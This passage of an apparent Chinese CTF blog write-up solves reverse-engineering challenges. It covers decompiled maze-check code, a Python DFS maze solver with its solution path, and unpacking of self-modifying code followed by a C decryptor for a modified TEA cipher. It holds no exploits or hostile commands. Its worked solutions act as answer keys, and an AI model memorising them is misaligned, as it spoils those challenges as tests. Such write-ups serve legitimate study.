class="line">      <span class="keyword">if</span> ( --dword_408040 &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You crossed the line!Get out of here!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">      v3 = a1 + <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">      v3 = a1 + <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++dword_408040 &gt; <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You crossed the line!Get out of here!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_11:</span><br><span class="line">      sub_401A26();</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      v3 = a1 - <span class="number">8</span>;</span><br><span class="line">LABEL_12:</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">511</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      <span class="keyword">if</span> ( dword_408060[v3] )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_408044 = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You crossed the line!Get out of here!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v3;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">LABEL_16:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You crossed the line!Get out of here!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们分析完了源码接下来就是思考如何获取迷宫，我们采用动调的方式进行取值，我们输入很多u，让他每次判断都是往u的判断里走，因为我们要让dword_408040的值变化，因为生成迷宫的函数中就是根据这个的值进行变化的，然后每次他都会调用一下sub_401A26(),生成对应层的迷宫，调用完了后，我们手动把RIP的值改成0x0000000000401B0F，让他再次进入u这个case判断中，对dword_408040进行自加1，然后继续调用sub_401A26，直到最后dword_408040的值大于7位置，我们到目前也能判断出他是8x8x8的三维迷宫</p><p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031182756375.png" alt="image-20231031182756375"></p><p>调试出了迷宫后我们就可以使用脚本，或者自己读出我们的路径了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">maze = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># maze[x * 64 + y * 8 + z]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_point_valid</span>(<span class="params"><span class="built_in">map</span>, x, y, z</span>):</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) <span class="keyword">and</span> (x &lt;= <span class="number">7</span>) <span class="keyword">and</span> (y &gt;= <span class="number">0</span>) <span class="keyword">and</span> (y &lt;= <span class="number">7</span>) <span class="keyword">and</span> (z &gt;= <span class="number">0</span>) <span class="keyword">and</span> (z &lt;= <span class="number">7</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">map</span>[x * <span class="number">64</span> + y * <span class="number">8</span> + z] != <span class="number">1</span>) <span class="keyword">and</span> ((<span class="built_in">map</span>[x * <span class="number">64</span> + y * <span class="number">8</span> + z] == <span class="number">0</span>) <span class="keyword">or</span> (<span class="built_in">map</span>[x * <span class="number">64</span> + y * <span class="number">8</span> + z] == <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_nex</span>(<span class="params"><span class="built_in">map</span>, x, y, z</span>):</span><br><span class="line">    all_dir = []</span><br><span class="line">    <span class="keyword">if</span> check_point_valid(<span class="built_in">map</span>, x - <span class="number">1</span>, y, z):</span><br><span class="line">        all_dir.append((x - <span class="number">1</span>, y, z, <span class="string">&#x27;q&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> check_point_valid(<span class="built_in">map</span>, x + <span class="number">1</span>, y, z):</span><br><span class="line">        all_dir.append((x + <span class="number">1</span>, y, z, <span class="string">&#x27;u&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> check_point_valid(<span class="built_in">map</span>, x, y - <span class="number">1</span>, z):</span><br><span class="line">        all_dir.append((x, y - <span class="number">1</span>, z, <span class="string">&#x27;w&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> check_point_valid(<span class="built_in">map</span>, x, y + <span class="number">1</span>, z):</span><br><span class="line">        all_dir.append((x, y + <span class="number">1</span>, z, <span class="string">&#x27;s&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> check_point_valid(<span class="built_in">map</span>, x, y, z - <span class="number">1</span>):</span><br><span class="line">        all_dir.append((x, y, z - <span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> check_point_valid(<span class="built_in">map</span>, x, y, z + <span class="number">1</span>):</span><br><span class="line">        all_dir.append((x, y, z + <span class="number">1</span>, <span class="string">&#x27;d&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(all_dir)</span><br><span class="line">    <span class="keyword">return</span> all_dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_success</span>(<span class="params"><span class="built_in">map</span>, x, y, z</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">map</span>[x * <span class="number">64</span> + y * <span class="number">8</span> + z] == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">mapb, x, y, z, path</span>):</span><br><span class="line">    <span class="built_in">map</span> = mapb.copy()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">map</span>[x * <span class="number">64</span> + y * <span class="number">8</span> + z] != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">map</span>[x * <span class="number">64</span> + y * <span class="number">8</span> + z] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> check_success(<span class="built_in">map</span>, x, y, z):</span><br><span class="line">        <span class="built_in">print</span>(path)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    next_point = gen_nex(<span class="built_in">map</span>, x, y, z)</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> next_point:</span><br><span class="line">        pathn = path + n[<span class="number">3</span>]</span><br><span class="line">        dfs(<span class="built_in">map</span>, n[<span class="number">0</span>], n[<span class="number">1</span>], n[<span class="number">2</span>], pathn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">outpus = <span class="string">&quot;&quot;</span></span><br><span class="line">dfs(maze, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, outpus)</span><br></pre></td></tr></table></figure><blockquote><p>ssdddssuuuwwwwqqqdddduussaauuuaaaaassssqddddddduuwwwaasusssdd</p></blockquote><p>我们分析最后的函数，可以直接通过动调获取flag</p><p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031183240426.png" alt="image-20231031183240426"></p><h3 id="WEEK3-ststst"><a href="#WEEK3-ststst" class="headerlink" title="[WEEK3]ststst"></a>[WEEK3]ststst</h3><p>SMC加tea</p><p>我们分析代码，可以看到有一段修改内存的函数，以及赋予内存修改权限的mprotect，我们猜测这就是SMC的自解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400763</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  mprotect(&amp;dword_400000, <span class="number">0x1000</span>uLL, <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (sub_400763 - sub_400696); ++i )</span><br><span class="line">    *(sub_400696 + i) ^= <span class="number">0xC3</span>u;</span><br><span class="line">  <span class="keyword">return</span> mprotect(&amp;dword_400000, <span class="number">0x1000</span>uLL, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接动调，然后选中全部的数据按u，然后选中函数头按c和p，就可以编译成一个完整的函数,我们可以看到是一个魔改tea加密，他修改了sum的值，我们用别人的脚本跑一下就行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400696</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, _DWORD *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> sum; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v0 = *a1;</span><br><span class="line">  v1 = a1[<span class="number">1</span>];</span><br><span class="line">  sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">    v0 += (v1 + sum) ^ (<span class="number">16</span> * v1 + *key) ^ ((v1 &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]);</span><br><span class="line">    v1 += (v0 + sum) ^ (<span class="number">16</span> * v0 + key[<span class="number">2</span>]) ^ ((v0 &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v0;</span><br><span class="line">  result = v1;</span><br><span class="line">  a1[<span class="number">1</span>] = v1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/mary19920410/article/details/71518130">浅析C语言之uint8_t &#x2F; uint16_t &#x2F; uint32_t &#x2F;uint64_t-CSDN博客</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> delta = <span class="number">0x61C88647</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> v3 = v[<span class="number">0</span>];</span><br><span class="line"><span class="type">uint32_t</span> v4 = v[<span class="number">1</span>];</span><br><span class="line"><span class="type">uint32_t</span> sum = ((<span class="number">32</span> * (-delta)) &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; i++) &#123;</span><br><span class="line">v4 -= (v3 + sum) ^ (<span class="number">16</span> * v3 + k[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">v3 -= (v4 + sum) ^ (<span class="number">16</span> * v4 + k[<span class="number">0</span>]) ^ ((v4 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">sum += <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;</span><br><span class="line">v[<span class="number">0</span>] = v3;</span><br><span class="line">v[<span class="number">1</span>] = v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123; <span class="number">0x01234567</span>, <span class="number">0x89ABCDEF</span>, <span class="number">0xFEDCBA98</span>, <span class="number">0x76543210</span> &#125;;</span><br><span class="line"><span class="type">uint32_t</span> <span class="built_in">array</span>[<span class="number">8</span>] = &#123; <span class="number">0xDB8F2569</span>, <span class="number">0x40CD83E3</span>, <span class="number">0xA033E680</span>, <span class="number">0xFFF7A644</span>,</span><br><span class="line"><span class="number">0x690C3A17</span>, <span class="number">0xB621B866</span>, <span class="number">0x34E7E2A7</span>, <span class="number">0xAD10A692</span> &#125;; <span class="comment">//密码数据</span></span><br><span class="line"><span class="type">uint32_t</span> temp[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">temp[<span class="number">0</span>] = <span class="built_in">array</span>[i];</span><br><span class="line">temp[<span class="number">1</span>] = <span class="built_in">array</span>[i + <span class="number">1</span>];</span><br><span class="line">decrypt(temp, key);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c%c%c%c%c&quot;</span>, *((<span class="type">char</span>*)&amp;temp[<span class="number">0</span>] + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">0</span>] +</span><br><span class="line"><span class="number">1</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">0</span>] + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">0</span>] + <span class="number">3</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">1</span>] + <span class="number">0</span>), *</span><br><span class="line">((<span class="type">char</span>*)&amp;temp[<span class="number">1</span>] + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">1</span>] + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;temp[<span class="number">1</span>] + <span class="number">3</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="WEEK3-easyre"><a 